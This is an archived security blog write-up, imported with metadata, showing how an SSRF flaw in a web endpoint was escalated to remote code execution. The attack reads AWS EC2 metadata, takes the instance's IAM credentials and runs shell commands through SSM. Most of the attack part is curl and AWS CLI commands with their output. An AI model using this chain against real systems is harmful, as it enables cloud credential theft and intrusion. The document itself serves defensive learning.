---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-02-06_escalating-ssrf-to-rce.md
original_filename: 2021-02-06_escalating-ssrf-to-rce.md
title: Escalating SSRF to RCE
category: documents
detected_topics:
- ssrf
- cloud-security
- command-injection
- otp
tags:
- imported
- documents
- ssrf
- cloud-security
- command-injection
- otp
language: en
raw_sha256: bbba6177c9c5090f610b5e1a02b3fc5591f609fae854dd31c6babf15dcce766a
text_sha256: d6672de530424f985e45f9dd8d55b0b3a3b2001a759773cf6eaf05d982559420
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: true
---

# Escalating SSRF to RCE

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-02-06_escalating-ssrf-to-rce.md
- Source Type: markdown
- Detected Topics: ssrf, cloud-security, command-injection, otp
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: True
- Raw SHA256: `bbba6177c9c5090f610b5e1a02b3fc5591f609fae854dd31c6babf15dcce766a`
- Text SHA256: `d6672de530424f985e45f9dd8d55b0b3a3b2001a759773cf6eaf05d982559420`


## Content

---
title: "Escalating SSRF to RCE"
url: "https://sanderwind.medium.com/escalating-ssrf-to-rce-7c0147371c40"
authors: ["Sander Wind (@SanderWind)"]
bugs: ["SSRF", "RCE"]
publication_date: "2021-02-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3932
scraped_via: "browseros"
---

# Escalating SSRF to RCE

Press enter or click to view image in full size
Escalating SSRF to RCE
Retrieving AWS metadata and use it for RCE
Sander Wind
Follow
4 min read
·
Feb 6, 2021

570

2

Recently, I stumbled upon a SSRF vulnerability allowing retrieval of the Amazon metadata for the EC2 instance running the vulnerable software. But how to proceed and turn the SSRF into RCE?

When researching a web application, I stumbled upon an endpoint which allowed me to perform SSRF. I’ll use the endpoint http://example.com/fetch?url=[path] as example.

Performing curl http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/ results in listing the directory contents of the Amazon metadata service.

$ curl http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/

First, let’s check the instance details so we know which region to use when performing AWS CLI commands.

$ curl http://example.com/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/document
{
  "accountId" : "19xxxxxxxxxx",
  "architecture" : "x86_64",
  "availabilityZone" : "eu-west-1c",
  "billingProducts" : null,
  "devpayProductCodes" : null,
  "marketplaceProductCodes" : null,
  "imageId" : "ami-xxxxxxxxxxxxxxxxx",
  "instanceId" : "i-xxxxxxxxxxxxxxxxx",
  "instanceType" : "r0x.large",
  "kernelId" : null,
  "pendingTime" : "2021-01-01T13:37:00Z",
  "privateIp" : "172.10.1.1",
  "ramdiskId" : null,
  "region" : "eu-west-1",
  "version" : "2020-01-01"
}

The item to keep in mind is "region": "eu-west-1". Now check the presence of security credentials. These credentials will lead us to the RCE.

Get Sander Wind’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

When requesting http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/, a list with credentials is shown.

$ curl http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
webserver

Let’s check the contents of the webserver credentials!

$ curl http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webserver
{
  "Code" : "Success",
  "LastUpdated" : "2021-02-05T13:37:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAxxxxxxxxxxxxxxxx",
  "SecretAccessKey" : "XxxxXxxxXxxxXxxxXxxxXxxxXxxxXxxxXxxxXxxx",
  "Token" : "A-secret-base64-encoded-token",
  "Expiration" : "2021-02-06T13:37:00Z"
}

To check if the credentials are usable we are going to use the AWS CLI. For the next commands, use the data from the above request and the region value we retrieved before (eu-west-1).

$ export ***REDACTED-AWS-KEY***_ID="[AccessKeyId]"
$ export ***REDACTED-AWS-KEY***_ACCESS_KEY="[SecretAccessKey]"
$ export AWS_DEFAULT_REGION="[region]"
$ export AWS_SESSION_TOKEN="[Token]"

Now it’s time to check the identity of the token.

$ aws sts get-caller-identity
{
  "UserId": "AROAxxxxxxxxxxxxxxxxx:i-xxxxxxxxxxxxxxxxx",
  "Account": "19xxxxxxxxxx",
  "Arn": "arn:aws:sts::19xxxxxxxxxx:assumed-role/webserver/i-xxxxxxxxxxxxxxxxx"
}

The Account property will be the same as the accountId in the document metadata endpoint. Same goes for the part after the : in UserId which is the same as the instanceId in the document metadata endpoint.

To get RCE we need to know on what instances the security credential is accepted for executing commands.

$ aws ssm describe-instance-information --output text --query "InstanceInformationList[*]"
1.2.3.4  example-1234567890.eu-west-1.elb.amazonaws.com 172.10.1.100  i-xxxxxxxxxxxxxxxxx  False  2021-02-05T13:37:00.000000+01:00  Online  Amazon Linux AMI  Linux  2020.01 EC2Instance

A list of available instances will be returned to send commands to. Let’s test the command execution on one of the instances from above list (copy the i-xxxxxxxxxxxxxxxxx value).

⚠️ Make sure to execute a safe command like whoami or uname. We do not want to disturb any services or even kill the instance.

$ aws ssm send-command --document-name "AWS-RunShellScript" --comment "RCE test: whoami" --targets "Key=instanceids,Values=[instanceid]" --parameters 'commands=whoami'
{
  "Command": {
  "CommandId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "DocumentName": "AWS-RunShellScript",
  "DocumentVersion": "",
  "Comment": "RCE test: whoami",
  "ExpiresAfter": "2021-02-05T13:37:00.000000+01:00",
  "Parameters": {
  "commands": [
  "whoami"
  ]
  },
  "InstanceIds": [],
  "Targets": [
  {
  "Key": "instanceids",
  "Values": [
  "i-xxxxxxxxxxxxxxxxx"
  ]
  }
  ],
  "RequestedDateTime": "2021-02-05T13:37:00.000000+01:00",
  "Status": "Pending",
  "StatusDetails": "Pending",
  "OutputS3BucketName": "",
  "OutputS3KeyPrefix": "",
  "MaxConcurrency": "50",
  "MaxErrors": "0",
  "TargetCount": 0,
  "CompletedCount": 0,
  "ErrorCount": 0,
  "DeliveryTimedOutCount": 0,
  "ServiceRole": "",
  "NotificationConfig": {
  "NotificationArn": "",
  "NotificationEvents": [],
  "NotificationType": ""
  },
  "CloudWatchOutputConfig": {
  "CloudWatchLogGroupName": "",
  "CloudWatchOutputEnabled": false
  },
  "TimeoutSeconds": 3600
  }
}

Copy the CommandId from above and use it in the following command to check the output of the executed command.

$ aws ssm list-command-invocations --command-id "[CommandId]" --details
{
  "CommandInvocations": [
  {
  "CommandId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
  "InstanceId": "i-xxxxxxxxxxxxxxxxx",
  "InstanceName": "",
  "Comment": "RCE test: whoami",
  "DocumentName": "AWS-RunShellScript",
  "DocumentVersion": "",
  "RequestedDateTime": "2021-02-05T13:37:00.000000+01:00",
  "Status": "Success",
  "StatusDetails": "Success",
  "StandardOutputUrl": "",
  "StandardErrorUrl": "",
  "CommandPlugins": [
  {
  "Name": "aws:runShellScript",
  "Status": "Success",
  "StatusDetails": "Success",
  "ResponseCode": 0,
  "ResponseStartDateTime": "2021-02-05T13:37:00.000000+01:00",
  "ResponseFinishDateTime": "2021-02-05T13:37:00.000000+01:00",
  "Output": "root\n",
  "StandardOutputUrl": "",
  "StandardErrorUrl": "",
  "OutputS3Region": "eu-west-1",
  "OutputS3BucketName": "",
  "OutputS3KeyPrefix": ""
  }
  ],
  "ServiceRole": "",
  "NotificationConfig": {
  "NotificationArn": "",
  "NotificationEvents": [],
  "NotificationType": ""
  },
  "CloudWatchOutputConfig": {
  "CloudWatchLogGroupName": "",
  "CloudWatchOutputEnabled": false
  }
  }
  ]
}

If the command didn’t finish yet, the Status will be pending. When successfully executed the output is shown in CommandInvocations.CommandPlugins.Output.

>root 🔥

⁉️ Do you have ideas or suggestion for RCE using AWS security credentials? Let me know in the comments, I’m open to improvements!
